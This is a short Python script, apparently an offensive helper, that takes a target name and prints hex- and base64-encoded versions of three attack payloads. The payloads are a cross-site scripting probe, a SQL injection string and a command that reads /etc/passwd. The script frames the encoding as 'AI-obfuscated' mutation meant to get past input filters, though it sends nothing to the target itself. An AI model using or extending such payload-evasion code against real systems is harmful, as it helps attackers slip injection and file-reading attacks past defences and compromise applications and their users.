import sys
import base64
import random

def generate_obfuscated_payload(target):
    print(f"[🧠] Generating AI-Obfuscated Payloads for {target}...")
    base_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "cat /etc/passwd"]
    
    mutated = []
    for p in base_payloads:
        # Simple mutation logic: Hex encoding and Base64 wrapping
        hex_encoded = "".join([hex(ord(c)) for c in p])
        b64_encoded = base64.b64encode(p.encode()).decode()
        mutated.append(f"HEX:{hex_encoded} | B64:{b64_encoded}")
    
    return "\n".join(mutated)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(generate_obfuscated_payload(sys.argv[1]))
